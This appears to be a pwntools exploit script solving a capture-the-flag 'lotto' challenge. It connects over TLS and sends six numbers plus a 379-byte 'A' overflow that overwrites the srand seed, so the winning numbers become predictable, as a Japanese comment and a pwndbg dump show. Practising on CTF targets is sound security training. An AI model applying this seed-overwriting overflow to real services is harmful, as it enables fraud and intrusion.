from pwn import *

context.log_level = "debug"

hostname = "lotto-ee1e61dd70cfaa86.chal.bts.wh.edu.pl"

io = process(
    [
        "openssl",
        "s_client",
        "-connect",
        f"{hostname}:443",
        "-servername",
        hostname,
        "-quiet",
    ]
)
io.sendlineafter(b"Enter 6 numbers", b"15 12 29 31 38 37 " + b"A" * 379)
io.interactive()

"""
srand に渡す seed を AAAAAAA で上書きする
→ rand の戻り値は固定になる

pwndbg> x/6dw 0x5a2650a94250
0x5a2650a94250 <winingNumbers>: 15      12      29      31
0x5a2650a94260 <winingNumbers+16>:      38      37
"""
